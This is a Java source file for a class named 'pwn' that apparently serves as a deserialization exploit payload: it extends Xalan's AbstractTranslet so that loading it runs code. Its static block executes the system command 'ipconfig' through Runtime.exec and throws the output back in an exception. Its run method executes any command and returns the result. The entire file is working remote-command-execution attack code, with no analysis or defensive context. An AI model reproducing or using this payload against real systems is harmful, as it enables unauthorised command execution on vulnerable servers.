package foo;
import java.io.*;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class pwn
  extends AbstractTranslet
{
  public void transform(DOM document, SerializationHandler[] handlers)
    throws TransletException
  {}
  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
    throws TransletException
  {}
  public static String run(String cmd) {
	  try {
			String s = "";
			int len;
			int bufSize = 4096;
			byte[] buffer = new byte[bufSize];
			BufferedInputStream bis;
			bis = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream(),bufSize);
			while ((len = bis.read(buffer, 0, bufSize)) != -1)
			s += new String(buffer, 0, len);

			bis.close();
			return s;
		} catch (IOException e) {
			return e.getMessage();
		}
  }
  static
  {
	    Object localObject = null;
	    if (true) {
	    	throw new RuntimeException(pwn.run("ipconfig"));
	    }
  }
}
